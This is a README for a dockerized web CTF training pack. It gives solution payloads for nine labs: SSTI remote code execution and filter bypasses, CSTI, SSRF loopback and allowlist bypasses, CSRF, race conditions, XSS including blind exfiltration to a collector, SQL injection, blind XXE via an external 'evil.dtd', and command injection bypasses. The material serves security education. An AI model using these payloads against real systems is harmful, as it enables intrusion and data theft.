# Advanced Web CTF Lab Pack (9 vulnerability classes)

Nine self-contained, dockerized labs, each with 2-3 progressively harder
examples. Every flag requires actually exploiting the bug — there are no
shortcuts or debug endpoints.

| # | Lab | Port(s) | Levels |
|---|-----|---------|--------|
| 1 | SSTI (Jinja2) | 5101 | raw injection / blacklist bypass / strict-filter bypass |
| 2 | CSTI (AngularJS 1.2.9) | 5102 | raw injection / blacklist bypass |
| 3 | SSRF | 5103 (+ internal service, not exposed) | naive / loopback-blacklist bypass / allowlist bypass |
| 4 | CSRF | 5104 | GET-based / POST no token / broken token check |
| 5 | Race Condition | 5105 | coupon over-redeem / overdraft |
| 6 | XSS | 5106 (+ blind bot, no published port) | reflected x3 / DOM x2 / blind |
| 7 | SQL Injection | 5107 | UNION / boolean-blind / time-blind |
| 8 | XML Injection / XXE | 5108 (+ collector 5109) | in-band / blind OOB |
| 9 | Command Injection | 5110 | naive / blacklist bypass / strict-filter bypass |

## Run everything

```
docker compose up --build -d
docker compose down
```

Or a single lab: `docker compose up --build ssti`

**Before hosting for real players:** change every `FLAG*`, `SECRET_KEY`,
`ADMIN_SESSION_TOKEN` and `ADMIN_PASSWORD` environment variable in
`docker-compose.yml`. Run all of this in an isolated network — several of
these containers are deliberately vulnerable to remote code execution.

---

# 1. SSTI — Server-Side Template Injection (port 5101)

Flask app rendering user input through `Jinja2.render_template_string`.
Each level's flag lives in a root-owned file (`/flag1.txt`, `/flag2.txt`,
`/flag3.txt`) that only real RCE can read — there's no shortcut.

### Level 1 — `/level1?name=...` — no filter
The server builds the template with an f-string: `render_template_string(f"Hello, {name}!")`.
Any Jinja2 syntax you send becomes part of the template itself.

**Solve:**
```
?name={{ lipsum.__globals__.os.popen('cat /flag1.txt').read() }}
```
`lipsum` is a default Jinja2 global function; its `__globals__` dict
includes the real `os` module, giving you `popen`.

### Level 2 — `/level2?bio=...` — blacklists `config, os, import, popen, subprocess, system`
Split every banned word across a Jinja2 string-concat (`~`) so it never
appears as a literal substring in your request:
```
?bio={{ (lipsum.__globals__[('o'~'s')]|attr('po'~'pen'))('cat /flag2.txt').read() }}
```

### Level 3 — `/level3?msg=...` — also blocks `class, mro, base, global`, and literal `__`
Build `__globals__` without ever typing two underscores adjacently, and
split `global` so `global` never appears as a substring either:
```
?msg={{ ((lipsum|attr(('_'*2)~'glob'~'als'~('_'*2)))[('o'~'s')]|attr('po'~'pen'))('cat /flag3.txt').read() }}
```

---

# 2. CSTI — Client-Side Template Injection (port 5102)

A real vendored AngularJS **1.2.9** compiles a "product review" that's
inserted directly into the page's HTML *before* Angular runs — so an
Angular expression in your review becomes a live, evaluated expression
against the page's scope, which holds a `secretFlag` the app never
intentionally displays.

(Note: 1.2.9's sandbox blocks any literal `.constructor` access and blocks
calling the real `Function` object outright, so the historically famous
`{{constructor.constructor('alert(1)')()}}` / `charAt` sandbox-escape
tricks don't transfer cleanly to this exact build. This lab instead
teaches the vulnerability class's real-world core: reading/calling hidden
scope data through attacker-controlled template syntax.)

### Level 1 — `/level1?review=...` — no filter
```
?review={{secretFlag}}
```

### Level 2 — `/level2?review=...` — blocks the literal substring `secretflag`
Use Angular's own `$eval()` with string concatenation so the banned word
never appears literally in your request:
```
?review={{ $eval("secretF"+"lag") }}
```

---

# 3. SSRF — Server-Side Request Forgery (port 5103)

A "fetch this URL" tool, plus a separate `internal-service` container that
is **not published to the host** — only reachable from inside the Docker
network, like a real internal metadata endpoint. There's also a
localhost-only `/internal/admin` panel on the SSRF app itself, which
checks `request.remote_addr`.

### Level 1 — `/level1?url=...` — no validation
```
?url=http://internal-service:8000/latest/meta-data/flag
```

### Level 2 — `/level2?url=...` — blocks literal `127.0.0.1`, `localhost`, `169.254`, `internal-service`
The target this time is the SSRF app's own `/internal/admin`, which
trusts any request whose source IP is loopback. Reach loopback with a
string that isn't in the blacklist:
```
?url=http://127.1/internal/admin
?url=http://0177.0.0.1/internal/admin      (octal)
?url=http://2130706433/internal/admin       (decimal)
```
All three resolve to `127.0.0.1` but none contain the blocked substrings.

### Level 3 — `/level3?url=...` — allowlist requires the URL to start with `http://public-api.lab.local`
The check is a naive string **prefix** match with no boundary character
required after the hostname. Use the URL's userinfo (`user@host`) syntax:
real HTTP clients treat everything before the last `@` as discarded
userinfo and connect to whatever comes after it — but the string still
*starts with* the allowed text:
```
?url=http://public-api.lab.local@127.0.0.1:5000/internal/admin
```

---

# 4. CSRF — Cross-Site Request Forgery (port 5104)

"SecureBank" — log in (a session is created automatically on `/`), then
open the matching page under `/exploit/levelN.html` in another tab to
play the attacker. Each exploit page is also servable from a different
origin to demonstrate the real cross-site attack.

### Level 1 — GET-based transfer, zero protection
`/level1/transfer?to=attacker&amount=500` changes state on a GET request.
`exploit/level1.html` loads that URL via an `<img>` tag — visiting it
while logged in silently transfers funds.

### Level 2 — POST-based transfer, no CSRF token at all
`exploit/level2.html` is a hidden auto-submitting form that POSTs to
`/level2/transfer` the moment the page loads.

### Level 3 — has a CSRF token field... validated against itself
The form includes `csrf_token` *and* `csrf_token_confirm`, and the server
only checks that the two submitted values match each other — never
against anything stored server-side. `exploit/level3.html` submits
`csrf_token=anything` / `csrf_token_confirm=anything` and passes.

**Lesson:** a CSRF token is only meaningful if it's generated per-session
and validated against that stored value — never against another value
the attacker also controls.

---

# 5. Race Condition (port 5105)

### Level 1 — `POST /level1/redeem` — one-time coupon, no lock
Check-then-act with an artificial processing delay and no lock. Fire many
concurrent requests (not one at a time):
```python
import requests, concurrent.futures
s = requests.Session(); s.get("http://localhost:5105/")
with concurrent.futures.ThreadPoolExecutor(10) as ex:
    results = list(ex.map(lambda _: s.post("http://localhost:5105/level1/redeem").json(), range(10)))
```
The coupon gets redeemed many times instead of once; the flag appears
once `redeemed >= 3`.

### Level 2 — `POST /level2/withdraw {"amount": N}` — overdraft via TOCTOU
The balance check reads a stale value, sleeps, then decrements the *live*
balance with no lock. Fire 5 concurrent withdrawals of 80 against a
starting balance of 100 — several succeed past zero, driving the balance
negative and revealing the flag.

---

# 6. XSS — Reflected / DOM / Blind (port 5106)

### Reflected
- **Level 1** `/reflected/level1?q=...` — raw HTML body, no encoding at all:
  `?q=<script>alert(document.domain)</script>`
- **Level 2** `/reflected/level2?name=...` — attribute context, only `<`/`>`
  stripped, quotes untouched — break out of the attribute:
  `?name=" onmouseover="alert(1)`
- **Level 3** `/reflected/level3?term=...` — inline `<script>` string
  context, only `"` is backslash-escaped. Don't fight the quote escaping —
  close the `<script>` tag entirely instead:
  `?term=</script><script>alert(document.domain)</script>`

### DOM-based (runs entirely in your own browser — view-source to see the sink)
- **Level 1** `/dom/level1#<payload>` — `location.hash` written straight
  into `innerHTML`: `#<img src=x onerror=alert(1)>`
- **Level 2** `/dom/level2?cfg=...` — a query param is passed to `eval()`
  directly: `?cfg=alert(document.domain)`

### Blind
Submit a payload at `/blind`; a **real** admin bot (`happy-dom` in Node,
not a stub) visits `/admin/queue` on a timer with an attached admin
session cookie, and genuinely executes any script your stored message
contains. The flag lives behind `/admin/secret`, which only responds to
requests carrying the real admin cookie:
```html
<script>fetch("/admin/secret").then(r=>r.text()).then(d=>fetch("/collect?data="+encodeURIComponent(d)))</script>
```
Submit that as your feedback message, wait for the bot's next visit
(every 5s by default), then check `GET /collected` — the flag is there,
exfiltrated exactly the way a real blind-XSS cookie/token theft works.

---

# 7. SQL Injection (port 5107) — SQLite backend

### Level 1 — `/level1?q=...` — UNION-based
`name LIKE '%<q>%'` with 4 columns (`id, name, price, category`):
```
?q=nonexistent' UNION SELECT id, flag, 0, 'x' FROM secrets--
```

### Level 2 — `/level2?username=...` — boolean-blind
Response is only ever "User exists" / "User not found" — no data shown.
The flag is literally the admin's password field. Extract it one
character at a time:
```
?username=admin' AND (unicode(substr((SELECT password FROM users WHERE username='admin'),1,1))=67)--
```
(67 = `'C'`). Loop over position and ASCII code; "User exists" = true.

### Level 3 — `/level3?id=...` — time-based blind
Response text **never changes** — no boolean oracle at all, not even an
error. The only side channel is timing, via a custom `SLEEP()` SQLite
function:
```
?id=1 OR (SELECT CASE WHEN (1=1) THEN SLEEP(2) ELSE 0 END)
```
A 2-second response = true. Extract the hidden `flag_time` table's value
character by character the same way, replacing `1=1` with a condition on
`substr(value,N,1)`.

---

# 8. XML Injection / XXE (port 5108, with a `collector` helper on 5109)

### Level 1 — `/level1` POST `xml=...` — in-band, reflected
Classic external entity, read straight into the response:
```xml
<?xml version="1.0"?>
<!DOCTYPE review [ <!ENTITY xxe SYSTEM "file:///flag1.txt"> ]>
<review><product>K</product><rating>5</rating><comment>&xxe;</comment></review>
```

### Level 2 — `/level2` POST `xml=...` — blind, nothing is ever reflected
Response is always `Processed.`, parse errors included — no in-band
channel at all. Exfiltrate out-of-band through an external DTD. The
`collector` container (port 5109) hosts the malicious DTD and logs
whatever reaches it:
```xml
<?xml version="1.0"?>
<!DOCTYPE invoice [ <!ENTITY % remote SYSTEM "http://collector:9000/evil.dtd"> %remote; ]>
<invoice><item>test</item></invoice>
```
The DTD (visible at `GET /evil.dtd` on the collector) reads `/flag2.txt`
on the target and sends it back to the collector's own `/leak` endpoint
via a chained parameter entity. Check the result at `http://localhost:5109/leaked`.

(Note: this flag is deliberately bracket-free — `{`/`}` aren't valid
unescaped characters inside a URL, and classic OOB XXE has no built-in
way to base64-wrap the leaked data the way PHP's `php://filter` can. This
is a genuine real-world constraint of the technique, not a shortcut.)

---

# 9. Command Injection (port 5110)

A "ping" tool built with `subprocess.run(f"ping -c 1 -W 1 {host}", shell=True)`.

### Level 1 — `/level1?host=...` — no filtering
```
?host=127.0.0.1; cat /flag1.txt
```

### Level 2 — `/level2?host=...` — blocks `; & | \` $(`
None of those characters are needed — a newline is just as good a shell
command separator and isn't on the blacklist:
```
?host=127.0.0.1%0acat%20/flag2.txt
```

### Level 3 — `/level3?host=...` — also blocks spaces and tabs
No spaces allowed anywhere. Use a newline to separate commands (still not
blocked) and `<` redirection instead of a space before the filename:
```
?host=127.0.0.1%0acat</flag3.txt
```

---

## What's inside each folder

Every lab folder has its own `Dockerfile`, `requirements.txt` and `app.py`
(or, for CSTI, a vendored `static/angular.min.js`; for the XSS blind bot,
a Node `bot.js` + `package.json`; for SSRF/XXE, a helper sub-service).
Every flag in this pack was confirmed by actually exploiting the running
app — there are no stub/debug endpoints anywhere.